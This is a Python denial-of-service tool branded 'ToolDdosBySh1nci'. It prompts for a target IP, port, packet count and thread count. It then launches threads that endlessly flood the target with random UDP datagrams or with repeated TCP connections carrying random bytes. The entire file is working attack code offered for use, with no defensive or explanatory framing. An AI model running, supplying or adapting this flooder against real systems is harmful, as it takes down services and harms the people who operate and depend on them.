#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print(" ToolDdosBySh1nci ")
print(" __  __    ____  _     _            _ ")
print(" \ \/ /___/ ___|| |__ / |_ __   ___(_) ")
print(" \  // __\___ \| '_ \| | '_ \ / __| | ")
print(" /  \\__ \___) | | | | | | | | (__| | ")
print(" /_/\_\___/____/|_| |_|_|_| |_|\___|_| ")
                                      

ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" GASKEN DDOS?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREAD:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[ATTACK!!]","[ATTACK!!]","[ATTACK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SH1NCI NIH DEK!!!")
		except:
			print("[!] BOOM!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[ATTACK!!]","[ATTACK!!]","[ATTACK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SH1NCI NIH DEK!!!")
		except:
			s.close()
			print("[*] BOOM")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
